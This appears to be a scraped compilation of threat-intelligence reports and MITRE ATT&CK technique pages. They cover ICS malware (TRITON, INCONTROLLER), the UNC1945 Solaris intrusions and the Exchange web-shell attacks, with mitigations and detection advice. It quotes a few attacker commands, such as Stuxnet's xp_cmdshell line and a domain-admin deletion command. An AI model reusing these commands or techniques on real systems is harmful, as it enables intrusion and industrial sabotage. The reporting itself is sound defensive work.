binary from persisting in the environment. Mandiant confirmed that, after correcting patching the attack script to remove this check, the payload binary would persist in controller memory, and the controller would continue to run. TRITON implements the TriStation protocol, which is the protocol used by the legitimate TriStation application, to configure controllers. TsHi is the high-level interface created by the malwareâs authors that allows the threat actorâs operators to implement attack scripts using the TRITON framework. It exposes functions for both reconnaissance and attack. The functions generally accept binary data from the user, and handle the code âsigningâ and check sums prior to passing the data to lower level libraries for serialization on to the network. TsBase, another attacker-written module, contains the functions called by TsHi, which translate the attackerâs intended action to the appropriate TriStation protocol function code. For certain functions, it also packs and pads the data in to the appropriate format. TsLow is an additional attacker module that implements the TriStation UDP wire protocol. The TsBase library primarily depends on the ts_exec method. This method takes the function code and expected response code, and serializes the commands payload over UDP. It checks the response from the controller against the expected value and returns a result data structure indicating success or a False object representing failure. TsLow also exposes the connect method used to check connectivity to the target controller. If invoked with no targets, it runs the device discovery function detect_ip. This leverages a ""ping"" message over the TriStation protocol using IP broadcast to find controllers that are reachable via a router from where the script is invoked.

Learn morearrow_forward Start for Free   In early 2022, Mandiant, in partnership with Schneider Electric, analyzed a set of novel industrial control system (ICS)-oriented attack toolsâwhich we call INCONTROLLER (aka PIPEDREAM)âbuilt to target machine automation devices. The tools can interact with specific industrial equipment embedded in different types of machinery leveraged across multiple industries. While the targeting of any operational environments using this toolset is unclear, the malware poses a critical risk to organizations leveraging the targeted equipment. INCONTROLLER is very likely state sponsored and contains capabilities related to disruption, sabotage, and potentially physical destruction. INCONTROLLER represents an exceptionally rare and dangerous cyber attack capability. It is comparable toÂ TRITON, which attempted to disable an industrial safety system in 2017; INDUSTROYER, which caused a power outage in Ukraine in 2016; and STUXNET, which sabotaged the Iranian nuclear program around 2010. To help asset owners find and defend against INCONTROLLER, we have included a range of mitigations and discovery methods throughout this report. As future modifications to these tools are likely, we believe behavior-based hunting and detection methods will be most effective. If you need support responding to related activity, please contactÂ Mandiant Consulting. Further analysis of related threats is available as part ofÂ Mandiant Advantage Threat Intelligence.Â  This report is related to information shared in CISAÂ Alert (AA22-103A).Â For more information from Schneider Electric, please seeÂ their bulletin. For more information from CODESYS, please seeÂ their advisory. INCONTROLLER is comprised of three main components: Tool Description TAGRUN A tool that scans for OPC servers, enumerates OPC structure/tags, brute forces credentials, and reads/writes OPC tag values. CODECALL A framework that communicates using Modbusâone of the most common industrial protocolsâand Codesys. CODECALL contains modules to interact with, scan, and attack at least three Schneider Electric programmable logic controllers (PLCs). Â  OMSHELL A framework with capabilities to interact with and scan some types of Omron PLCs via HTTP, Telnet, and Omron FINS protocol. The tool can also interact with Omron's servo drives, which use feedback control to deliver energy to motors for precision motion control. Â  Industrial automation networks rely on a variety of equipment that enable operators to translate information and instructions into chains of physical actions. Given the diversity of assets present in industrial networks, industrial automation equipment typically speaks different languages across different portions of the network, which is possible using standardized industrial communication protocols. INCONTROLLER includes three tools that enable the attacker to send instructions to ICS devices using industrial network protocols, such as OPC UA; Modbus; Codesys, which is used by EcoStruxure Machine Expert and SoMachine; and Omron FINS. While the tool's capabilities could enable the actor to communicate with a variety of products from different original equipment manufacturers (OEMs), the actor developed modules for specific controllers from Schneider Electric and Omron. The targeted equipment consists of machine automation solutions whose use cases span from supporting simple, repetitive machines to complex modular machines in distributed architectures: We highly doubt that the threat actor would target these devices at random. It is more likely they were chosen because of reconnaissance into specific target environment(s). We note that this would be consistent with previous ICS malware, such as TRITON, which targeted a critical safety system that was almost certainly identified prior to compromising the target's industrial environment. TAGRUN's capabilities, such as the ability to scan for and enumerate OPC UA servers, suggests a reconnaissance role. OPC acts as a central communications protocol to collect and store data from ICS assets in industrial environments. Access to this data can provide attackers with a detailed overview of production systems and control processes. The tool was likely developed for reconnaissance, but it can also write and change tag values, which could be used to modify data to either support an attack or mask process changes. TAGRUN also verifies whether the target environment is running a Windows operating system and provides different ping commands depending on this check's return value. This suggests that the actor may use non-Windows devices to execute TAGRUN. TAGRUNâs capabilities include: CODECALL communicates with ICS devices using the Modbus protocol, which potentially gives it the ability to interact with devices from different manufacturers. However, the tool contains a specific module to interact with, scan, and attack Schneider Electric's Modicon M251 (TM251MESE) PLC using Codesys, which is used by the company's proprietary EcoStruxure Machine Expert protocol. We have reason to believe the tool also targets Schneider Electric's Modicon M221 Nano PLC and the Modicon M258 PLC, and it potentially affects additional devices leveraging these protocols. CODECALLâs general capabilities include: OMSHELL is designed to obtain shell access to Omron PLCs, including Omron NX1P2, NJ501, R88D-1SN10F-ECT servo drive, and possibly other similar devices from the NJ/NX product lines. The tool primarily operates using the HTTP protocol, however it also utilizes Omron's proprietary FINS over UDP protocol for scanning and device identification. The framework is modular, which means the attacker can develop and deploy additional capabilities into the tool. OMSHELLâs capabilities include: We have reason to believe that indicator-based detections would not be effective at detecting INCONTROLLER in victim environments, in part because the attacker would almost certainly modify or customize the tool prior to using it in a specific victim environment. Instead, defenders should focus their efforts onÂ behavior-based hunting and detection methods for these tools. We are also tracking two additional tools affecting Windows-based systems that may be related to this threat activity. It is possible that these tools could be used to support the overall attack lifecycle in an INCONTROLLER attack by exploiting Windows-based systems in IT or operational technology (OT) environments. It is feasible that each tool could be used independently, or the actor may use the three tools to attack a single environment. We highlight that the devices targeted by INCONTROLLER are often integrated in automation machinery (e.g., a milling machine or press) and could plausibly be present in a variety of industrial sectors and processes even without the user's explicit knowledge. We developed three cyber physical attack scenarios that highlight a range of possible outcomes from an attack using INCONTROLLER. In each of the three cases, TAGRUN could have been used at earlier stages to enumerate the victim environment, identify its targets, and learn about the physical process. The impact of these scenarios would depend on the nature of the victim facility and the extent of the attacker's understanding of and interaction with the controlled physical process. We note that our current understanding of INCONTROLLER is still limited given that it leverages an extensible structure that can support new features implemented by the author. We believe INCONTROLLER is very likely linked to a state-sponsored group given the complexity of the malware, the expertise and resources that would be required to build it, and its limited utility in financially motivated operations. We are unable to associate INCONTROLLER with any previously tracked group at this stage of our analysis, but we note the activity is consistent with Russia's historical interest in ICS. While our evidence connecting INCONTROLLER to Russia is largely circumstantial, we note it given Russia's history of destructive cyber attacks, its current invasion of Ukraine, and related threats against Europe and North America. While the nature of any potential intended victims remains uncertain, INCONTROLLER poses a critical risk to organizations with compatible devices. The targeted devices are embedded in multiple types of machinery and could plausibly be present in many different industrial sectors. Given the consistencies with prior Russia-nexus threat activity, we suggest that INCONTROLLER poses the greatest threat to Ukraine, NATO member states, and other states actively responding to Russia's invasion of Ukraine. Organizations should take immediate action to determine if the targeted ICS devices are present in their environments and begin applying vendor-specific countermeasures. We also recommend that at-risk organizations conduct threat hunts to detect this activity in their networks. Mandiant Advantage Threat Intelligence subscribers have access to additional reporting containing threat hunting guidance and YARA detections. If you need support responding to related activity, please contactÂ Mandiant Consulting. Further analysis is available as part ofÂ Mandiant Advantage Threat Intelligence. We recommend several steps to mitigate risk and counter malicious activity in environments using this protocol: To help keep your Schneider Electric products secure and protected, it is in your best interest that you implement the cyber security best practices as indicated in the Cybersecurity Best Practices document provided on the Schneider Electric website:Â Recommended Cybersecurity Best Practices White paper | Schneider Electric. Additionally,Â Cybersecurity Guidelines for EcoStruxure Machine Expert, Modicon and PacDrive Controllers and Associated Equipment User GuideÂ could help you ensure that only legitimate users can access your Schneider Electric product:Â Cybersecurity Guidelines for EcoStruxure Machine Expert, Modicon and PacDrive Controllers and Associated Equipment, User Guide | Schneider Electric. You should pay special attention to features and cyber security devices that help to restrict access to authorized users only. This includes examples such as intrusion detection systems, network firewalls, secure remote access, device authentication, device firewall, disabling/filtering unsecure or programming protocols. According to public vulnerability notices, Omron has previously identified other vulnerabilities that use the same or similar FIN ports that are used by OMSHELL. Omron's guidance for unpatched vulnerabilities, as noted in theirÂ security brief, indicates that external firewall filtering of identified FIN ports can be used as a mitigation. Mandiant believes that the recommended methodology may be a viable mitigation, though this mechanism has not been tested with INCONTROLLER.

Automation of the Mandiant expert to make security operations more effective & efficient. See your organization through the eyes of the attacker. CTI is refined insight into cyber threats. Intelligence teams use credible insight from multiple sources to create actionable context on the threat landscape, threat actors and their tactics, techniques and procedures (TTPs). The effective use of CTI allows organizations to make the shift from reactive to becoming more proactive against threat actors. Proactive security refers to the use of credible threat intelligence to understand the malware and TTPs threat actors use and the vulnerabilities they exploit to target specific industries and regions. Organizations use this intelligence to implement, configure and adjust security tools and train staff to thwart attacks. A threat actor is a person or group of people who conduct malicious targeting or attacks on others. Typically motivated by espionage, financial gain or publicity, threat actors may conduct a full campaign alone or work with other groups who specialize in specific aspects of an attack. Assuming we all agree that a âthreatâ is defined as a plan or inclination to attack as opposed to an âattackâ which is an existing or previously successful breach. Identifying active threats can be done using threat intelligence which will help provide context into the threat actors and malware impacting your specific region or industry. Another method to identify active threats is by scanning the open, deep and dark web for chatter around your organization, personnel, technology or partners. By identifying threats like these security professionals can proactively adjust their defenses to block or reduce the impact of a potential attack.

Mandiant Blog 1,https://attack.mitre.org/techniques/T1140/,"Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file.[1] Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.[2] Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. [3] ABK has the ability to decrypt AES encrypted payloads.[4] Action RAT can use Base64 to decode actor-controlled C2 server communications.[5] Agent Tesla has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.[6] Amadey has decoded antivirus name strings.[7] AppleJeus has decoded files received from a C2.[8] AppleSeed can decode its payload prior to execution.[9] An APT19 HTTP malware variant decrypts strings using single-byte XOR keys.[10] An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.[11][12] APT39 has used malware to decrypt encrypted CAB files.[13] Aria-body has the ability to decrypt the loader configuration and payload DLL.[14] Astaroth uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code. [15][16] AuditCred uses XOR and RC4 to perform decryption on the code functions.[17] Avaddon has decrypted encrypted strings.[18] Avenger has the ability to decrypt files downloaded from C2.[4] AvosLocker has deobfuscated XOR-encoded strings.[19] Azorult uses an XOR key to decrypt content and uses Base64 to decode the C2 address.[20][21] Babuk has the ability to unpack itself into memory using XOR.[22][23] BabyShark has the ability to decode downloaded files prior to execution.[24] BackConfig has used a custom routine to decrypt strings.[25] BADFLICK can decode shellcode using a custom rotating XOR cipher.[26] Bandook has decoded its PowerShell script.[27] Bankshot decodes embedded XOR strings.[28] Bazar can decrypt downloaded payloads.

Mandiant Blog 1,https://attack.mitre.org/techniques/T0807/,"Adversaries may utilize command-line interfaces (CLIs) to interact with systems and execute commands. CLIs provide a means of interacting with computer systems and are a common feature across many types of platforms and devices within control systems environments. [1] Adversaries may also use CLIs to install and run new software, including malicious tools that may be installed over the course of an operation. CLIs are typically accessed locally, but can also be exposed via services, such as SSH, Telnet, and RDP.  Commands that are executed in the CLI execute with the current permissions level of the process running the terminal emulator, unless the command specifies a change in permissions context. Many controllers have CLI interfaces for management purposes. During the 2016 Ukraine Electric Power Attack, Sandworm Team supplied the name of the payload DLL to Industroyer via a command line parameter.[2] The name of the Industroyer payload DLL is supplied by the attackers via a command line parameter supplied in one of the main backdoors execute a shell command commands. [3] Sandworm Team uses the MS-SQL server xp_cmdshell command, and PowerShell to execute commands. [4] Stuxnet will store and execute SQL code that will extract and execute Stuxnet from the saved CAB file using xp_cmdshell with the following command: set @s = master..xp _ cmdshell extrac32 /y +@t+ +@t+x; exec(@s); [5] Consider removing or restricting features that are unnecessary to an asset's intended function within the control environment. Execution prevention may block malicious software from accessing protected resources through the command line interface. Monitor logs from installed applications (e.g., historian logs) for unexpected commands or abuse of system features. On Windows and Unix systems monitor executed commands and arguments that may use shell commands for execution. Shells may be common on administrator, developer, or power user systems depending on job function. On network device and embedded system CLIs consider reviewing command history if unauthorized or suspicious commands were used to modify device configuration. Monitor for processes spawning from known command shell applications (e.g., PowerShell, Bash). Benign activity will need to be allow-listed. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.

Mandiant Blog 1,https://attack.mitre.org/techniques/T0809/,"Adversaries may perform data destruction over the course of an operation. The adversary may drop or create malware, tools, or other non-native files on a target system to accomplish this, potentially leaving behind traces of malicious activities. Such non-native files and other data may be removed over the course of an intrusion to maintain a small footprint or as a standard part of the post-intrusion cleanup process. [1] Data destruction may also be used to render operator interfaces unable to respond and to disrupt response functions from occurring as expected. An adversary may also destroy data backups that are vital to recovery after an incident. Standard file deletion commands are available on most operating system and device interfaces to perform cleanup, but adversaries may use other tools as well. Two examples are Windows Sysinternals SDelete and Active@ Killdisk. INCONTROLLER can wipe the memory of Omron PLCs and reset settings through the remote HTTP service.[2][3][4]  Industroyer has a destructive wiper that overwrites all ICS configuration files across the hard drives and all mapped network drives specifically targeting ABB PCM600 configuration files. [5] KillDisk is able to delete system files to make the system unbootable and targets 35 different types of files for deletion. [6] Utilize central storage servers for critical operations where possible (e.g., historians) and keep remote backups. For outstations, use local redundant storage for event recorders. Have backup control system platforms, preferably as hot-standbys to respond immediately to data destruction events. [7] Minimize permissions and access for service accounts to limit the information that may be impacted by malicious users or software. [7] Protect files stored locally with proper permissions  to limit opportunities for adversaries to impact data storage. [7] Monitor executed commands and arguments for binaries that could be involved in data destruction activity, such as SDelete. Monitor for unexpected deletion of files. Monitor for changes made to a large quantity of files for unexpected modifications in both user directories and directories used to store programs and OS components (e.g., C:\Windows\System32).

Mandiant Blog 1,https://attack.mitre.org/techniques/T0831/,"Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection.    Methods of Manipulation of Control include:  A Polish student used a remote controller device to interface with the Lodz city tram system in Poland. [1] [2] [3] Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops. [2] The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact. [3] Industroyer toggles breakers to the open state utilizing unauthorized command messages. [4] During the Oldsmar Treatment Plant Intrusion, the threat actors utilized an operator HMI to manipulate process control setpoint values far beyond normal operating levels.[5] Stuxnet can reprogram a PLC and change critical parameters in such a way that legitimate commands can be overridden or intercepted. In addition, Stuxnet can apply inappropriate command sequences or parameters to cause damage to property. [6] Protocols used for control functions should provide authenticity through MAC functions or digital signatures. If not, utilize bump-in-the-wire devices or VPNs to enforce communication authenticity between devices that are not capable of supporting this (e.g., legacy controllers, RTUs). Take and store data backups from end user systems and critical servers. Ensure backup and storage systems are hardened and kept separate from the corporate network to prevent compromise.  Maintain and exercise incident response plans  [7], including the management of gold-copy back-up images and configurations for key systems to enable quick recovery and response from adversarial activities that impact control, view, or availability. Utilize out-of-band communication to validate the integrity of data from the primary channel.

Mandiant Blog 1,https://attack.mitre.org/techniques/T0855/,"Adversaries may send unauthorized command messages to instruct control system assets to perform actions outside of their intended functionality, or without the logical preconditions to trigger their expected function. Command messages are used in ICS networks to give direct instructions to control systems devices. If an adversary can send an unauthorized command message to a control system, then it can instruct the control systems device to perform an action outside the normal bounds of the device's actions. An adversary could potentially instruct a control systems device to perform an action that will cause an Impact. [1] In the Dallas Siren incident, adversaries were able to send command messages to activate tornado alarm systems across the city without an impending tornado or other disaster. [2] [3] INCONTROLLER can send custom Modbus commands to write register values on Schneider PLCs.[4]  INCONTROLLER can send write tag values on OPC UA servers.[4]  Using its protocol payloads, Industroyer sends unauthorized commands to RTUs to change the state of equipment. [5] Industroyer2 is capable of sending command messages from the compromised device to target remote stations to open data channels, retrieve the location and values of Information Object Addresses (IOAs), and modify the IO state values through Select Before Operate I/O, Select/Execute, and Invert Default State operations.[6][7] In the Maroochy Water Breach, the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer.[8] In the Ukraine 2015 Incident, Sandworm Team issued unauthorized commands to substation breakers after gaining control of operator workstations and accessing a distribution management system (DMS) client application. [9] Protocols used for control functions should provide authenticity through MAC functions or digital signatures. If not, utilize bump-in-the-wire devices or VPNs to enforce communication authenticity between devices that are not capable of supporting this (e.g., legacy controllers, RTUs). Perform inline allowlisting of automation protocol commands  to prevent devices from sending unauthorized command or reporting messages. Allow/denylist techniques need to be designed with sufficient accuracy to prevent the unintended blocking of valid messages. Use host-based allowlists to prevent devices from accepting connections from unauthorized systems. For example, allowlists can be used to ensure devices can only connect with master stations or known management/engineering workstations. [10] Segment operational assets and their management devices based on their functional role within the process. Enabling more strict isolation to more critical control and operational information within the control environment. [11] [12] [10] [13]  Devices should authenticate all messages between master and outstation assets. Devices and programs that receive command messages from remote systems (e.g., control servers) should verify those commands before taking any actions on them. Monitor for anomalous or unexpected commands that may result in changes to the process operation (e.g., discrete write, logic and device configuration, mode changes) observable via asset application logs. Monitor for unexpected ICS protocol command functions to controllers from existing master devices (including from new processes) or from new devices. The latter is like detection for Rogue Master but requires ICS function level insight to determine if an unauthorized device is issuing commands (e.g., a historian). Monitoring for unexpected or problematic values below the function level will provide better insights into potentially malicious activity but at the cost of additional false positives depending on the underlying operational process. Monitor for new or unexpected connections to controllers, which could indicate an Unauthorized Command Message being sent via Rogue Master. Monitor industrial process history data for events that correspond with command message functions, such as setpoint modification or changes to system status for key devices. This will not directly detect the techniqueâs execution, but instead may provide additional evidence that the technique has been used and may complement other detections.

Learn morearrow_forward Start for Free   Through Mandiant investigation of intrusions, the FLARE Advanced Practices team observed a group we track as UNC1945 compromise managed service providers and operate against a tailored set of targets within the financial and professional consulting industries by leveraging access to third-party networks (see this blog post for an in-depth description of âUNCâ groups). UNC1945 targeted Oracle Solaris operating systems, utilized several tools and utilities against Windows and Linux operating systems, loaded and operated custom virtual machines, and employed techniques to evade detection. UNC1945 demonstrated access to exploits, tools and malware for multiple operating systems, a disciplined interest in covering or manipulating their activity, and displayed advanced technical abilities during interactive operations. Mandiant discovered and reported to Oracle CVE-2020-14871, which was addressed in Oracle's October 2020 Critical Patch Update. Mandiant recommends staying current on all current patch updates to ensure a high security posture. We will discuss this vulnerability in greater detail in a follow up blog post. The threat actor demonstrated experience and comfort by utilizing unique tactics, techniques and procedures (TTPs) within Unix environments, demonstrating a high level of acumen in conjunction with ease of operability in Microsoft Windows operating systems. They were successful navigating multiple segmented networks and leveraging third-party access to extend operations well beyond the initial victim. Furthermore, UNC1945 operated from several virtual machines pre-configured with post-exploitation tools in addition to their custom toolset to evade detection and forensics. In late 2018, UNC1945 gained access to a Solaris server and installed a backdoor we track as SLAPSTICK in order to capture connection details and credentials to facilitate further compromise. The SSH service of this server was exposed to the internet at the time, the same time we observed first evidence of threat activity. Unfortunately, due to insufficient available evidence, the next indication of activity was in mid-2020 at which time a different Solaris server was observed connecting to the threat actor infrastructure. This indicates a dwell time of approximately 519 days based on recovered artifacts. The threat actor used a Solaris Pluggable Authentication Module backdoor we refer to as SLAPSTICK to establish a foothold on a Solaris 9 server. This facilitated user access to the system with a secret hard-coded password and allowed the threat actors to escalate privileges and maintain persistence (see Figure 1). Figure 1: SLAPSTICK logs At the initial victim, UNC1945 placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder. A day later, the threat actor positioned a custom Linux backdoor, which Mandiant named LEMONSTICK, on the same workstation. LEMONSTICK capabilities include command execution, file transfer and execution, and the ability to establish tunnel connections. (see Figure 2). Figure 2: UNC1945 emplacement of SLAPSTICKÂ  UNC1945 obtained and maintained access to their external infrastructure using an SSH Port Forwarding mechanism despite the host lacking accessibility to the internet directly. SSH Port Forwarding is a mechanism implemented in SSH protocol for transporting arbitrary networking data over an encrypted SSH connection (tunneling). This feature can be used for adding encryption to legacy applications traversing firewalls or with malicious intent to access internal networks from the the internet. The UNC1945 configurations we observed are similarly structured with respect to the host alias, specified options, and option order (see Figure 3). Figure 3: SSH config files used by UNC1945 at different incidents As part of this multi-stage operation, UNC1945 dropped a custom QEMU Virtual Machine (VM) on multiple hosts, which was executed inside of any Linux system by launching a âstart.shâ script. The script contained TCP forwarding settings that could be used by the threat actor in conjunction with the SSH tunnels to give direct access from the threat actor VM to the command and control server to obfuscate interaction with customer infrastructure. The VM was running a version of the Tiny Core Linux OS with pre-loaded scripts and tools. Also, we analyzed the Virtual Machine file system timestamps, which coincided with UNC1945's overall operational timeline. The VM contained numerous tools such as network scanners, exploits and reconnaissance tools. Tiny Core Linux pre-loaded tools included Mimikatz, Powersploit, Responder, Procdump, CrackMapExec, PoshC2, Medusa, JBoss Vulnerability Scanner and more. Efforts to decrease operational visibility included placing tool and output files within temporary file system mount points that were stored in volatile memory. Additionally, UNC1945 used built-in utilities and public tools to modify timestamps and selectively manipulate Unix log files. UNC1945 employed anti-forensics techniques with the use of a custom ELF utility named LOGBLEACH. The actor used built-in Linux commands to alter the timestamps of files and directories and used LOGBLEACH to clean logs to thwart forensic analysis, as seen in Figure 4. Figure 4: LOGBLEACH To further obfuscate activity, a Linux ELF packer named STEELCORGI was executed in memory on the Solaris system. The malware contains various anti-analysis techniques, including anti-debugging, anti-tracing, and string obfuscation. It uses environment variables as a key to unpack the final payload. After successfully establishing a foothold, UNC1945 collected credentials, escalated privileges, and successfully moved laterally through multiple networks. UNC1945 obtained credentials via SLAPSTICK and open source tools such as Mimikatz, which enabled easy lateral movement throughout networks to obtain immediate access to other segments of the network and third-party environments. Stolen credentials collected by SLAPSTICK were used to traverse the customer network via SSH and deploy SLAPSTICK to additional hosts. After successfully authenticating, SLAPSTICK displays a welcome message, as seen in Figure 5. UNC1945 used ProxyChains to download PUPYRAT, an open source, cross-platform multi-functional remote administration and post-exploitation tool mainly written in Python. At one target, the threat actor used a virtual machine to initiate a brute-force of SSH targeting Linux and HP-UX endpoints. Beginning with seemingly random usernames and shifting to legitimate Linux and Windows accounts, the threat actor successfully established SSH connections on a Linux endpoint. After successfully escalating privileges on an HP-UX endpoint and a Linux endpoint, UNC1945 installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO. We observed UNC1945 use IMPACKET with SMBEXEC in a Microsoft Windows environment to execute commands remotely without the need to upload a payload to the target. SMBEXEC allows the threat actor to operate like PsExec, but without using RemComSvc. There are two main modes of using this tool that benefits attackers. Share mode allows the specification of a share that everything will be executed through. Server mode permits the output of the executed commands to be sent back by the target machine into a locally shared folder. At one victim, we observed UNC1945 moving laterally via Remote Desktop Protocol (RDP) to a Windows server before viewing the Server Manager Panel, viewing and modifying RDP-related system firewall rules and checking the application settings of two endpoint security services. Mandiant investigations found that the threat actor maintains various tools to interact with victim networks. In addition to custom tools, the UNC1945 VMs contained various tools (e.g. network scanners, exploits and reconnaissance; see Associated Tools and Malware section). In some intrusions, UNC1945 employed a SPARC executable identified as a reconnaissance tool. Based on publicly available information, this executable could be referred to as Luckscan or BlueKeep, the latter of which is part of the BKScan toolkit (see Figure 6). According to open sources, BlueKeep, aka âbkscanâ scanner, works both unauthenticated and authenticated (i.e. when Network Level Authentication is enabled). BlueKeep (CVE-2019-0708) is a security vulnerability that was discovered in Microsoft's Remote Desktop Protocol (RDP) implementation, which allows for the possibility of remote code execution. Despite this multi-staged operation, Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions we investigated. In at least one case, we observed ROLLCOAST ransomware deployment in the final phase of the threat actor activity, but Mandiant didnât attribute this activity to UNC1945. At this time, it is likely that access to the victim environment was sold to another group. The ease and breadth of exploitation in which UNC1945 conducted this campaign suggests a sophisticated, persistent actor comfortable exploiting various operating systems, and access to resources and numerous toolsets. Given the aforementioned factors, use of zero-day exploits and virtual machines, and ability to traverse multiple third-party networks, Mandiant expects this motivated threat actor to continue targeted operations against key industries while taking advantage of operating systems that likely have inadequate security visibility.Â Â Â  Â  EVILSUN is a remote exploitation tool that gains access to Solaris 10 and 11 systems of SPARC or i386 architecture using a vulnerability (CVE-2020-14871) exposed by SSH keyboard-interactive authentication. The remote exploitation tool makes SSH connections to hosts passed on the command line. The default port is the normal SSH port (22), but this may be overridden. EVILSUN passes the banner string SSH-2.0-Sun_SSH_1.1.3 over the connection in clear text as part of handshaking. LEMONSTICK is a Linux executable command line utility with backdoor capabilities. The backdoor can execute files, transfer files, and tunnel connections. LEMONSTICK can be started in two different ways: passing the `-c` command line argument (with an optional file) and setting the âOCBâ environment variable. When started with the `-c` command line argument, LEMONSTICK spawns an interactive shell. When started in OCB mode, LEMONSTICK expects to read from STDIN. The STDIN data is expected to be encrypted with the blowfish algorithm. After decrypting, it dispatches commands based on the nameâfor example: âexecutes terminal commandâ, âconnect to remote systemâ, âsend & retrieve fileâ, âcreate socket connectionâ. LOGBLEACH is an ELF utility that has a primary functionality of deleting log entries from a specified log file(s) based on a filter provided via command line. The following log files are hard coded in the malware, but additional log paths may be specified: OKSOLO is a publicly available backdoor that binds a shell to a specified port. It can be compiled to support password authentication or dropped into a root shell. OPENSHACKLE is a reconnaissance tool that collects information about logged-on users and saves it to a file. OPENSHACKLE registers Windows Event Manager callback to achieve persistence. ProxyChains allows the use of SSH, TELNET, VNC, FTP and any other internet application from behind HTTP (HTTPS) and SOCKS (4/5) proxy servers. This ""proxifier"" provides proxy server support to any application. PUPYRAT (aka Pupy) is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function RAT (Remote Administration Tool) and post-exploitation tool mainly written in Python. It features an all-in-memory execution guideline and leaves very low footprint. It can communicate using various transports, migrate into processes (reflective injection), and load remote Python code, Python packages and Python C-extensions from memory. STEELCORGI is a packer for Linux ELF programs that uses key material from the executing environment to decrypt the payload. When first starting up, the malware expects to find up to four environment variables that contain numeric values. The malware uses the environment variable values as a key to decrypt additional data to be executed. SLAPSTICK is a Solaris PAM backdoor that grants a user access to the system with a secret, hard-coded password. TINYSHELL is a lightweight client/server clone of the standard remote shell tools (rlogin, telnet, ssh, etc.), which can act as a backdoor and provide remote shell execution as well as file transfers.

Learn morearrow_forward Start for Free   Beginning in January 2021, Mandiant Managed Defense observed multiple instances of abuse of Microsoft Exchange Server within at least one client environment. The observed activity included creation of web shells for persistent access, remote code execution, and reconnaissance for endpoint security solutions. Our investigation revealed that the files created on the Exchange servers were owned by the user NT AUTHORITY\SYSTEM, a privileged local account on the Windows operating system. Furthermore, the process that created the web shell was UMWorkerProcess.exe, the process responsible for Exchange Serverâs Unified Messaging Service. In subsequent investigations, we observed malicious files created by w3wp.exe, the process responsible for the Exchange Server web front-end. In response to this activity, we built threat hunting campaigns designed to identify additional Exchange Server abuse. We also utilized this data to build higher-fidelity detections of web server process chains. On March 2, 2021, Microsoft released a blog post that detailed multiple zero-day vulnerabilities used to attack on-premises versions of Microsoft Exchange Server. Microsoft also issued emergency Exchange Server updates for the following vulnerabilities: CVE Risk Rating Access Vector Exploitability Ease of Attack Mandiant Intel CVE-2021-26855 Critical Network Functional Easy Link CVE-2021-26857 Medium Network Functional Easy Link CVE-2021-26858 Medium Network Functional Easy Link CVE-2021-27065 Medium Network Functional Easy Link Table 1: List of March 2021 Microsoft Exchange CVEs and FireEye Intel Summaries The activity reported by Microsoft aligns with our observations. FireEye currently tracks this activity in three clusters, UNC2639, UNC2640, and UNC2643. We anticipate additional clusters as we respond to intrusions. We recommend following Microsoftâs guidance and patching Exchange Server immediately to mitigate this activity. Based on our telemetry, we have identified an array of affected victims including US-based retailers, local governments, a university, and an engineering firm. Related activity may also include a Southeast Asian government and Central Asian telecom. Microsoft reported the exploitation occurred together and is linked to a single group of actors tracked as âHAFNIUMâ, a group that has previously targeted the US-based defense companies, law firms, infectious disease researchers, and think tanks. In this blog post, we will detail our observations on the active investigations we are currently performing. As our experience with and knowledge of this threat actor grows, we will update this post or release new technical details as appropriate. For our Managed Defense Customers, we have launched a Community Protection Event that will provide frequent updates on this threat actor and activity. We will be discussing these attacks more in an upcoming webinar on Mar. 17, 2021. Beginning in January 2021, Mandiant Managed Defense observed the creation of web shells on one Microsoft Exchange server file system within a customerâs environment. The web shell, named help.aspx (MD5: 4b3039cf227c611c45d2242d1228a121), contained code to identify the presence of (1) FireEye xAgent, (2) CarbonBlack, or (3) CrowdStrike Falcon endpoint products and write the output of discovery. Figure 1 provides a snippet of the web shellâs code. The web shell was written to the system by the UMWorkerProcess.exe process, which is associated with Microsoft Exchange Serverâs Unified Messaging service. This activity suggested exploitation of CVE-2021-26858. Approximately twenty days later, the attacker placed another web shell on a separate Microsoft Exchange Server. This second, partially obfuscated web shell, named iisstart.aspx (MD5: 0fd9bffa49c76ee12e51e3b8ae0609ac), was more advanced and contained functions to interact with the file system. As seen in Figure 2, the web shell included the ability to run arbitrary commands and upload, delete, and view the contents of files. While the use of web shells is common amongst threat actors, the parent processes, timing, and victim(s) of these files clearly indicate activity that commenced with the abuse of Microsoft Exchange. In March 2021, in a separate environment, we observed a threat actor utilize one or more vulnerabilities to place at least one web shell on the vulnerable Exchange Server. This was likely to establish both persistence and secondary access, as in other environments. In this case, Mandiant observed the process w3wp.exe, (the IIS process associated with the Exchange web front-end) spawning cmd.exe to write a file to disk. The file, depicted in Figure 3, matches signatures for the tried-and-true China Chopper. We observed that in at least two cases, the threat actors subsequently issued the following command against the Exchange web server: net group ""Exchange Organization administrators"" administrator /del /domain. This command attempts to delete the administrator user from the Exchange Organizations administrators group, beginning with the Domain Controller in the current domain. If the system is in a single-system domain, it will execute on the local computer. Per Microsoftâs blog, they have identified additional post-exploitation activities, including: The activity we have observed, coupled with others in the information security industry, indicate that these threat actors are likely using Exchange Server vulnerabilities to gain a foothold into environments. This activity is followed quickly by additional access and persistent mechanisms. As previously stated, we have multiple ongoing cases and will continue to provide insight as we respond to intrusions. We recommend checking the following for potential evidence of compromise: In 